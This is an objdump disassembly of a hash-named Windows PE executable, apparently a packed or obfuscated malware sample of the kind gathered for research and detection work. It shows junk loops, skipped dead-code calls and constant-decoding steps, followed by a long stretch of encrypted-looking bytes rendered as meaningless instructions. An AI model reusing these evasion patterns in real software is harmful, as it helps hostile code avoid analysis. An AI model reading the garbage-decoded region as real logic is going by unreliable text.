
8b7f0029e41b849d472dddadbe5115487d7ca71daff9e9e4fdeab5821b97cabe.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9fb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9ff
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42aa03
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42aa0b
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42aa0f
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42aa13
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42aa17
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax+0xca705df],esi
  4014ce:	cmp    esp,esi
  4014d0:	pop    edi
  4014d1:	add    DWORD PTR [ebx+0x60478383],0xffffff83
  4014d8:	sub    DWORD PTR [edx],0x31
  4014db:	sub    BYTE PTR [esi],bh
  4014dd:	cmp    ah,BYTE PTR es:[eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	in     al,dx
  4014e6:	jae    0x40155a
  4014e8:	jae    0x40155c
  4014ea:	dec    ebx
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	and    eax,0xc5bf0d29
  401581:	ds hlt 
  401583:	and    edx,esp
  401585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401586:	scas   al,BYTE PTR es:[edi]
  401587:	out    0x13,al
  401589:	adc    ch,dh
  40158b:	adc    ebx,DWORD PTR [edx+0x1fea9caf]
  401591:	mov    eax,0x450411ba
  401596:	push   esp
  401597:	dec    edx
  401598:	push   0x7c4cdd7
  40159d:	jecxz  0x401531
  40159f:	push   esp
  4015a0:	adc    ah,BYTE PTR [edx+0x58]
  4015a3:	aaa    
  4015a4:	pop    ds
  4015a5:	lods   al,BYTE PTR ds:[esi]
  4015a6:	cdq    
  4015a7:	inc    ebx
  4015a8:	and    ebx,DWORD PTR [bx-0x7]
  4015ac:	cmp    ah,0xc4
  4015af:	dec    ecx
  4015b0:	aad    0x2a
  4015b2:	cmp    DWORD PTR [ebx+ebx*1-0x1a],ebp
  4015b6:	ins    DWORD PTR es:[edi],dx
  4015b7:	inc    esi
  4015b8:	mov    edx,DWORD PTR [edi-0x5dade325]
  4015be:	cwde   
  4015bf:	cmp    eax,0x90e6dc0d
  4015c4:	clc    
  4015c5:	pop    eax
  4015c6:	inc    esp
  4015c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015c8:	adc    eax,0x77431b40
  4015cd:	adc    edi,DWORD PTR [edi+0x7]
  4015d0:	and    DWORD PTR [eax-0x1b93bd63],0x6725d46b
  4015da:	sbb    al,0x27
  4015dc:	hlt    
  4015dd:	test   eax,0xe6120fcb
  4015e2:	inc    esp
  4015e3:	jo     0x4015c8
  4015e5:	push   ecx
  4015e6:	cmp    eax,0xc682c1e6
  4015eb:	and    DWORD PTR [edx],0xe6402705
  4015f1:	pop    ebx
  4015f2:	pop    ebx
  4015f3:	or     edi,DWORD PTR [edx-0x44]
  4015f6:	ss push esi
  4015f8:	and    DWORD PTR [esi],0x9e8e9648
  4015fe:	repz xor BYTE PTR [ebx+0xf],dh
  401602:	adc    BYTE PTR [esp+edx*2+0xa],cl
  401606:	dec    eax
  401607:	mov    BYTE PTR [eax],ch
  401609:	aaa    
  40160a:	mov    fs,WORD PTR [ecx+ebx*2]
  40160d:	repz test al,0x2d
  401610:	adc    ah,BYTE PTR [ecx+0x7a]
  401613:	(bad)  
  401614:	adc    al,ah
  401616:	inc    esi
  401617:	cmp    BYTE PTR [edi+0x4a2fe47f],dh
  40161d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40161e:	pop    esp
  40161f:	pushf  
  401620:	pusha  
  401621:	cld    
  401622:	xchg   ecx,eax
  401623:	push   0x4f562b7e
  401628:	adc    DWORD PTR [ecx+0x35],esp
  40162b:	mov    ecx,0xa5aecb0c
  401630:	sub    al,0x75
  401632:	push   eax
  401633:	jl     0x40161a
  401635:	pop    ecx
  401636:	push   eax
  401637:	sbb    esp,DWORD PTR [edi+0x13]
  40163a:	stos   BYTE PTR es:[edi],al
  40163b:	addr16 aam 0xc2
  40163e:	cmp    ch,ah
  401640:	xor    DWORD PTR [edi-0x7a],ecx
  401643:	mov    edx,0xf88bb6c2
  401648:	call   0xf3e7:0xcfd704b
  40164f:	push   edi
  401650:	mov    BYTE PTR [eax],cl
  401652:	dec    ecx
  401653:	shr    DWORD PTR [edx],1
  401655:	ja     0x4016b4
  401657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401658:	out    dx,al
  401659:	push   ebp
  40165a:	outs   dx,BYTE PTR ds:[esi]
  40165b:	jnp    0x401673
  40165d:	add    BYTE PTR [edi+0x5ef07eb1],al
  401663:	mov    esp,0xf2c28999
  401668:	mov    dl,BYTE PTR [edx]
  40166a:	sub    eax,0x58fdfe35
  40166f:	mov    cl,0x96
  401671:	jb     0x401600
  401673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401675:	mov    bh,BYTE PTR [eax]
  401677:	mov    eax,ds:0x647f09ca
  40167c:	adc    bl,BYTE PTR [edi+esi*4-0x3d]
  401680:	dec    ebp
  401681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401682:	and    DWORD PTR [ebx+esi*1+0x7560c52b],esp
  401689:	mov    bh,0x8e
  40168b:	jmp    0x90dfd13c
  401690:	xlat   BYTE PTR ds:[ebx]
  401691:	mov    ds:0x4210af6e,al
  401696:	mov    edx,0x56b29a3
  40169b:	ror    BYTE PTR [esi],1
  40169d:	repnz xchg ebx,ebx
  4016a0:	daa    
  4016a1:	sbb    dl,BYTE PTR [edx]
  4016a3:	push   ds
  4016a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016a5:	cs hlt 
  4016a7:	retf   
  4016a8:	out    dx,al
  4016a9:	mov    bh,0x37
  4016ab:	cs cld 
  4016ad:	arpl   WORD PTR ds:0x94610542,bx
  4016b3:	sub    eax,DWORD PTR [ecx-0x66]
  4016b6:	fst    DWORD PTR [ebx]
  4016b8:	xchg   esi,eax
  4016b9:	pop    ecx
  4016ba:	mov    al,BYTE PTR [edx]
  4016bc:	push   ebp
  4016bd:	mov    BYTE PTR [ecx],dh
  4016bf:	mov    gs,WORD PTR [edx+0x31]
  4016c2:	mov    edx,0x77e0ed8e
  4016c7:	(bad)  [ebx]
  4016c9:	sahf   
  4016ca:	ss inc ebx
  4016cc:	inc    edx
  4016cd:	icebp  
  4016ce:	add    cl,bh
  4016d0:	test   al,0x57
  4016d2:	sub    al,0xe4
  4016d4:	mov    esp,0xedcf462c
  4016d9:	cmp    BYTE PTR [eax-0x588eacd6],bl
  4016df:	js     0x401675
  4016e1:	adc    eax,0x6c66a4ce
  4016e6:	inc    ebp
  4016e7:	mov    al,0x12
  4016e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ea:	imul   ebp,DWORD PTR [eax-0x70fe4013],0xffffffe4
  4016f1:	mov    al,ds:0x257028f6
  4016f6:	imul   ebp,DWORD PTR [ecx],0x5f1ba200
  4016fc:	pop    esp
  4016fd:	mov    eax,ds:0xd6fd730b
  401703:	gs jp  0x401718
  401706:	sbb    eax,0x6bdcfdb0
  40170b:	cdq    
  40170c:	cmp    BYTE PTR [esi-0x70d5a2d9],ah
  401712:	mov    al,BYTE PTR [ebx+0x1b]
  401715:	out    dx,eax
  401716:	cld    
  401717:	mov    ds:0xe8e71eea,al
  40171c:	inc    ebp
  40171d:	push   esp
  40171e:	mul    BYTE PTR [ecx]
  401720:	test   DWORD PTR [ecx],esp
  401722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401723:	cmp    ch,dl
  401725:	inc    eax
  401726:	in     al,0x4
  401728:	ins    BYTE PTR es:[edi],dx
  401729:	push   ebx
  40172a:	mov    ebx,0x9c03b34b
  40172f:	loopne 0x4016dc
  401731:	leave  
  401732:	and    eax,0xba7ee582
  401737:	div    DWORD PTR [ebx]
  401739:	xchg   BYTE PTR fs:[ebp+0x3c],al
  40173d:	pop    ebp
  40173e:	adc    BYTE PTR [edx+0x4e2492ed],bl
  401744:	add    al,0xee
  401746:	mov    ebp,0xf410ea7b
  40174b:	mov    ds:0xc9b5a842,eax
  401750:	inc    ebx
  401751:	call   0xde0:0x8fb7300a
  401758:	sub    esp,DWORD PTR [eax-0x2e7874c7]
  40175e:	xor    BYTE PTR [ecx-0xd884043],dh
  401764:	push   ss
  401765:	call   esi
  401767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401768:	mov    BYTE PTR [ebx-0x7],0xdc
  40176c:	cwde   
  40176d:	jne    0x4017b2
  40176f:	and    al,bl
  401771:	inc    eax
  401772:	inc    ecx
  401773:	xchg   edi,eax
  401774:	pop    esp
  401775:	out    dx,eax
  401776:	sub    eax,0xb0b70679
  40177b:	nop
  40177c:	fsub   QWORD PTR [ebp+0x3]
  40177f:	jno    0x4017b6
  401781:	inc    edi
  401782:	mov    ebx,0xed47f93a
  401787:	imul   ebp,DWORD PTR [ecx-0x4211e00e],0x6a3cfa7e
  401791:	sbb    al,dh
  401793:	push   es
  401794:	dec    ebx
  401795:	inc    edx
  401796:	js     0x4017e6
  401798:	xchg   esi,eax
  401799:	jge    0x401814
  40179b:	ficomp WORD PTR [ebp-0x5d7c272f]
  4017a1:	jnp    0x4017e7
  4017a3:	loopne 0x401820
  4017a5:	jno    0x401745
  4017a7:	or     eax,0xac94d2b0
  4017ac:	shl    DWORD PTR [ebx+0x9],cl
  4017af:	xor    DWORD PTR [esi+0x78],esi
  4017b2:	in     al,dx
  4017b3:	dec    esi
  4017b4:	adc    ah,BYTE PTR [ebp-0x5]
  4017b7:	mov    dh,0x90
  4017b9:	mov    ?,WORD PTR [edx+0x4b]
  4017bc:	fisubr DWORD PTR [ebp-0x41b9b34a]
  4017c2:	outs   dx,BYTE PTR ds:[esi]
  4017c3:	xchg   ebx,eax
  4017c4:	mov    eax,ds:0x3c012561
  4017c9:	das    
  4017ca:	in     eax,0xe4
  4017cc:	inc    ebp
  4017cd:	pushf  
  4017ce:	mov    WORD PTR [ebp+0x5a],ss
  4017d1:	dec    ebp
  4017d2:	(bad)  
  4017d3:	add    edx,edi
  4017d5:	out    dx,eax
  4017d6:	jb     0x4017b9
  4017d8:	scas   eax,DWORD PTR es:[edi]
  4017d9:	fstp   DWORD PTR [ecx+eax*4]
  4017dc:	in     al,dx
  4017dd:	iret   
  4017de:	fwait
  4017df:	sbb    al,0x14
  4017e1:	adc    ecx,ebp
  4017e3:	and    al,0x5d
  4017e5:	xchg   esi,eax
  4017e6:	aas    
  4017e7:	fdiv   st,st(0)
  4017e9:	add    eax,0x994d4926
  4017ee:	xchg   edi,eax
  4017ef:	xchg   edx,eax
  4017f0:	imul   DWORD PTR [eax-0x7f]
  4017f3:	nop
  4017f4:	js     0x401823
  4017f6:	fdiv   st(0),st
  4017f8:	pop    ds
  4017f9:	scas   al,BYTE PTR es:[edi]
  4017fa:	hlt    
  4017fb:	cld    
  4017fc:	je     0x4017c4
  4017fe:	js     0x4017c0
  401800:	mov    cs,WORD PTR [edi-0x27a3b362]
  401806:	adc    al,BYTE PTR [eax+0x158b5d2c]
  40180c:	(bad)  
  40180d:	xlat   BYTE PTR ds:[ebx]
  40180e:	out    dx,eax
  40180f:	lea    ebp,[ebx+0x5773e678]
  401815:	enter  0x367,0x7a
  401819:	in     eax,dx
  40181a:	dec    edx
  40181b:	push   ebp
  40181c:	ja     0x4017e5
  40181e:	mov    ecx,0x54f4181
  401823:	into   
  401824:	ffree  st(3)
  401826:	add    edx,0x69
  401829:	icebp  
  40182a:	(bad)  
  40182b:	xor    eax,0x6ebfa041
  401830:	sbb    edx,0xbe06af10
  401836:	bound  ecx,QWORD PTR [edi]
  401838:	pop    esp
  401839:	ds ja  0x4017ea
  40183c:	mov    edi,DWORD PTR [eax]
  40183e:	sub    DWORD PTR [ebp+esi*2+0x54ccca9a],esp
  401845:	mov    bl,0x7d
  401847:	dec    esp
  401848:	cli    
  401849:	push   ebx
  40184a:	cli    
  40184b:	jae    0x4018a0
  40184d:	fucomp st(5)
  40184f:	push   ss
  401850:	in     al,0xba
  401852:	jp     0x4018b0
  401854:	and    al,0x83
  401856:	cmp    edx,ebp
  401858:	nop
  401859:	jl     0x4018c1
  40185b:	mov    edx,0x33acb79a
  401860:	fwait
  401861:	mov    ch,0x36
  401863:	lods   al,BYTE PTR ds:[esi]
  401864:	(bad)  
  401865:	and    al,0x79
  401867:	int    0x63
  401869:	or     ch,BYTE PTR [esi-0xeed949]
  40186f:	pushf  
  401870:	dec    ecx
  401871:	sbb    DWORD PTR [edx],0xe905709b
  401877:	(bad)  
  401879:	stos   DWORD PTR es:[edi],eax
  40187a:	je     0x4018aa
  40187c:	xchg   BYTE PTR [ebx],bh
  40187e:	cwde   
  40187f:	jl     0x401892
  401881:	or     al,0x99
  401883:	stc    
  401884:	push   0x30
  401886:	jle    0x4018e1
  401888:	mov    edi,0xe1960c79
  40188d:	xor    edx,esi
  40188f:	scas   eax,DWORD PTR es:[edi]
  401890:	repz mov ah,0x61
  401893:	dec    eax
  401894:	pminub mm1,mm4
  401897:	dec    edi
  401898:	imul   ebx,DWORD PTR [edi],0x277f8a0c
  40189e:	lock and eax,0xe2be607e
  4018a4:	cmp    esi,DWORD PTR gs:[eax+0x12]
  4018a8:	(bad)  
  4018a9:	stc    
  4018aa:	loop   0x4018e9
  4018ac:	sbb    DWORD PTR [ebx+0x5e46b8c9],edx
  4018b2:	movaps xmm3,xmm6
  4018b5:	cli    
  4018b6:	xor    al,0xe8
  4018b8:	jl     0x7ca2b18
  4018be:	out    0x20,eax
  4018c0:	int3   
  4018c1:	retf   
  4018c2:	out    dx,al
  4018c3:	(bad)  
  4018c4:	jae    0x401867
  4018c6:	ror    DWORD PTR [edi+ebp*4],0xfe
  4018ca:	mov    dh,0x44
  4018cc:	mov    edi,DWORD PTR [ecx-0x32cb9aa]
  4018d2:	push   eax
  4018d3:	mov    esp,0x5cc307c8
  4018d8:	jno    0x40189c
  4018da:	lods   al,BYTE PTR ds:[esi]
  4018db:	lds    ebx,FWORD PTR [ebx]
  4018dd:	adc    DWORD PTR [edx+edi*2+0x4b],ebx
  4018e1:	ja     0x40186c
  4018e3:	bound  esp,QWORD PTR [ecx]
  4018e5:	into   
  4018e6:	and    BYTE PTR [ecx],bh
  4018e8:	test   al,0xcf
  4018ea:	or     DWORD PTR [esi+eax*2+0x43],esp
  4018ee:	lods   eax,DWORD PTR ds:[esi]
  4018ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018f0:	cmp    ch,cl
  4018f2:	aam    0x90
  4018f4:	add    al,0xd7
  4018f6:	sar    BYTE PTR [ebp-0xd],1
  4018f9:	mov    dh,0x8f
  4018fb:	outs   dx,DWORD PTR ds:[esi]
  4018fc:	push   es
  4018fd:	mov    edx,0x13405354
  401902:	lock mov ah,0x16
  401905:	aam    0x5d
  401907:	pop    esp
  401908:	jge    0x40193e
  40190a:	out    dx,al
  40190b:	push   cs
  40190c:	jg     0x40194f
  40190e:	test   DWORD PTR [edx],esi
  401910:	and    DWORD PTR [ebx],esp
  401912:	and    al,0xf3
  401914:	mov    al,ds:0xa2ea5bf1
  401919:	sbb    eax,0x827ee209
  40191e:	imul   edi,DWORD PTR [ebp+0x3424e89f],0x291df752
  401928:	and    BYTE PTR [edi-0x567e5695],ah
  40192e:	dec    edx
  40192f:	or     eax,0xaeaee46b
  401934:	int    0x3e
  401936:	aam    0x78
  401938:	jl     0x4018da
  40193a:	outs   dx,BYTE PTR ds:[esi]
  40193b:	xchg   ebp,eax
  40193c:	and    esi,DWORD PTR [ecx]
  40193e:	add    esp,edi
  401940:	lds    ebx,FWORD PTR [edi+0x7de0a8c1]
  401946:	jle    0x4019a1
  401948:	xor    al,0x51
  40194a:	dec    ecx
  40194b:	dec    ebx
  40194c:	test   eax,0xbc4eaac
  401951:	or     BYTE PTR [ebp+0x5f],ah
  401954:	mov    dh,0xd3
  401956:	cmp    DWORD PTR [eax-0xb],0xffffffd8
  40195a:	dec    edi
  40195b:	inc    ecx
  40195c:	push   ebx
  40195d:	popa   
  40195e:	retf   0xc7
  401961:	bound  ebx,QWORD PTR [edx-0x27]
  401964:	push   esp
  401965:	pusha  
  401966:	or     al,0xc
  401968:	dec    eax
  401969:	sub    esi,edi
  40196b:	sub    BYTE PTR [edx-0x19],ah
  40196e:	jno    0x4019c8
  401970:	sbb    edx,esi
  401972:	imul   ecx,DWORD PTR ds:0x20039fab,0x5603640c
  40197c:	adc    DWORD PTR [eax-0x51],esp
  40197f:	neg    dh
  401981:	jns    0x401933
  401983:	push   es
  401984:	lods   al,BYTE PTR ds:[esi]
  401985:	adc    BYTE PTR [esi+0x52],cl
  401988:	push   ds
  401989:	mov    bh,BYTE PTR [eax]
  40198b:	call   0xe0530ada
  401990:	push   esi
  401991:	jge    0x401987
  401993:	push   edx
  401994:	pop    edx
  401995:	jno    0x401934
  401997:	cmp    al,0x1a
  401999:	jbe    0x4019dd
  40199b:	xchg   esp,eax
  40199c:	sub    DWORD PTR [ecx-0x18],edx
  40199f:	mov    dl,0xfd
  4019a1:	lods   eax,DWORD PTR ds:[esi]
  4019a2:	movntq QWORD PTR [edx+0xe],mm7
  4019a6:	inc    esp
  4019a7:	call   0x4b2bbd20
  4019ac:	xor    BYTE PTR [eax-0x35328f45],ah
  4019b2:	jo     0x4019a9
